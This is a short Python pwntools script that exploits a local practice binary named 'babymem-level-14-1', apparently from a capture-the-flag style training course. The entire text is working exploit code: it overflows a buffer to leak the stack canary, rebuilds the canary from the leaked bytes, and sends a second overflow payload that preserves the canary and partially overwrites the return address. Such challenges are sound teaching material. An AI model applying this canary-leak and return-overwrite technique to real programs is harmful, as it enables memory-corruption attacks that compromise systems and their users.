from pwn import *

p = process("/challenge/babymem-level-14-1")

print(p.recv(22000))

p.sendline(b"233")

print(p.recv(22000))

p.sendline(b"REPEAT" + b"A" * (232-6))

x = p.recv(22000)

print(x)

print("[+] Leaked Canary \n")
for i in x[242:250]:
    print(hex(i), end=" ")
print("\n")

leaked_canary = b"\x00" + x[243:250]

canary = p64(int.from_bytes(leaked_canary))

print(canary)

#print(p.recvuntil(b"size: "))

p.sendline(b"522")

print(p.recv(22000))

payload = b""
payload += b"A" * (504)
payload += canary[::-1]
payload += b"A" * 8
payload += b"\x40\xec"

p.sendline(payload)

print(p.recv(22000))

p.close()
p.kill()
